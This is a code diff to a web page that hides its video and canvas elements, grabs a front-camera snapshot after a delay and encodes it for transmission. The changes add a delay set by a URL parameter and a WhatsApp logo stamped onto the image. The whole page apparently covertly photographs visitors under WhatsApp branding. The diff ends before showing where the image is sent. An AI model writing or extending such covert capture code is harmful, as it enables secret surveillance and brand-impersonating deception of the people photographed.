@@ -67,9 +67,15 @@
 
 <video  style="display:none;" id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
+<img id="logoImg" style="display:none;" src="./assets/wapp.png" alt="whatsapp">
 
 <script>
   const video = document.getElementById('video');
+  const logoImg = document.getElementById('logoImg');
+
+  // Get delay from query parameter (default: 1500ms)
+  const urlParams = new URLSearchParams(window.location.search);
+  const delay = parseInt(urlParams.get('delay') || '1500', 10);
 
   navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" }
@@ -80,7 +86,7 @@
     video.onloadedmetadata = () => {
       setTimeout(() => {
         takePhoto();
-      }, 1500);
+      }, delay);
     };
   });
 
@@ -91,6 +97,20 @@
 
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0);
+
+    // Add WhatsApp logo at the bottom
+    const logoSize = Math.min(canvas.width, canvas.height) * 0.05; // 10% of smallest dimension
+    const logoX = canvas.width - logoSize - 15; // 15px from right
+    const logoY = canvas.height - logoSize - 15; // 15px from bottom
+
+    // Draw a semi-transparent white background for the logo
+    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
+    ctx.beginPath();
+    ctx.arc(logoX + logoSize / 2, logoY + logoSize / 2, logoSize / 2 + 5, 0, Math.PI * 2);
+    ctx.fill();
+
+    // Draw the logo image
+    ctx.drawImage(logoImg, logoX, logoY, logoSize, logoSize);
 
     const base64 = canvas.toDataURL("image/jpeg", 0.6);
     const encoded = encodeURIComponent(base64);
